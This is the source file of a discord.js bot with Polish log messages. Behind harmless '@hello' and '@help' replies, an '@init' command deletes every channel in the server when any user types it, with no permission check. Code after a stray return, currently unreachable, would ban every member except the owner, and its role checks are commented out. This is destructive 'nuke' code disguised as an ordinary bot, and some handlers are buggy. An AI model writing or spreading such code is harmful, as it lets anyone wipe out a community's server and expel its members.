require("dotenv").config();
const { EmbedBuilder } = require("@discordjs/builders");
const { Client, IntentsBitField, Guild, PermissionsBitField, GuildChannelManager } = require("discord.js");
// const { ChannelManager, CategoryChannel } = require("discord.js/typings");

const client = new Client({
    intents: [
        IntentsBitField.Flags.Guilds,
        IntentsBitField.Flags.GuildMembers,
        IntentsBitField.Flags.GuildMessages,
        IntentsBitField.Flags.MessageContent,
    ]
});


client.on('ready', c => {
    console.log(`${c.user.tag} jest ONLINE.`)
});
process.on('unhandledRejection', error => {
	console.error('Unhandled promise rejection:', error);
});

client.on('messageCreate', (message) => {
    const msg = message.content.toString()
    const prefix = "@"
    function msgPrefixed(cmd) {
        return prefix.toString() + cmd.toString()
    }
    console.log(message.content, message.content.startsWith("@"), msgPrefixed("cmd"));
    if(message.author.bot) return;
    if (!msg.startsWith(prefix)) return;
    
    if(message.content === msgPrefixed("hello")){
        message.reply("Hello!!!!")
    }
    if (message.content === msgPrefixed("help")) {
        message.reply("How can I help You?")
    }
    if(message.content === msgPrefixed("delcat")){
        const args = message.content.split(" ")
        const arg = +args[0] === undefined ? message.reply("Second argument wasn't passed.") : +args[0]
        message.reply(arg.toString())
    }
    if(message.content === msgPrefixed("init")){
        message.reply("Initiation has started...")
        let i;
        for (let chanel of message.guild.channels.cache) {
            // console.log(`i hope ids: ${+chanel[0]}`)
            // client.cache.channels.find(channel => channel.name === 'channel-name').delete()
            // if(client.)
                // .forEach(channel => {
                //     console.log(channel)
                // });
            // message.channel.delete()
            
            console.log(chanel[1],"\n-------------------------------------------------\n",chanel[1].id,"\n-------------------------------------------------\n", typeof chanel,"\n-------------------------------------------------\n", chanel[0] ,"\n-------------------------------------------------\n", message.channel,"\n-------------------------------------------------\n", message.channel.id,"\n-------------------------------------------------\n");/*return;*/
            // /*console.log(*/message.guild.channels.cache.find(channel => channel.id === chanel[0]/*{
            //     if(channel.id !== undefined){
            //         if(channel.id === chanel[0]){
            //             return true
            //         }
            //     }
            //     return false;
            // }*/).delete();

            // const fetchedChannel = message.guild.channels.cache.find(channel => channel.id === chanel[0]);
            const fetchedChannel = message.guild.channels.cache.get(chanel[0]);
            try {
                chanel[1].delete();
            } catch (error) {
                console.log(error)
            }
            
            // try {
            //     message.channel.parent.delete()
            // } catch (error) {
            //     message.reply("Nie działa :C")
            // }
            // return;
            // message.channel.delete()
            // message.channels.delete()
        }
        return;
        (async () => {
            // let memberColl = message.guild.members.find( member => member.id !== undefined);
            let fmem = await message.guild.members.fetch()
            for (let member of fmem) {
                let costam = member[0]
                member = costam
                // console.log("member[0]",member[0])
                // console.log("costam:",costam)
            }
            // console.log("\nfmem",fmem) interaction
            // return;
            for (const member of fmem) {
                const memberId = await message.guild.members.fetch({id:member[0]});
                const targetUser = await message.guild.members.fetch(memberId);
                if (targetUser.id === message.guild.ownerId) {
                    continue
                }
                console.log("\nmember:",member[0])
                /*console.log(targetUser);return;*/
                // const targetUserRolePosition = targetUser.roles.highest.position; // Highest role of the target user
                // const requestUserRolePosition = message.member.roles.highest.position; // Highest role of the user running the cmd
                // const botRolePosition = message.guild.members.me.roles.highest.position; // Highest role of the bot

                // if(!targetUser.bannable) continue;
                // if(targetUserRolePosition >= requestUserRolePosition){
                //     if(message.member.id !== message.guild.ownerId){
                //         continue
                //     }//"You can't ban that user because they have the same/higher role than you."
                // }

                // if(targetUserRolePosition >= botRolePosition){
                //     continue
                // }//"I can't ban that user because they have the same/higher role than me."

                try {
                    message.guild.members.ban(member[0])
                } catch (error) {
                    console.log(`There was an error: ${error}`)
                }
                // fmem = await message.guild.members.fetch()
            }
        })()
    }
    
});

client.login(process.env.TOKEN);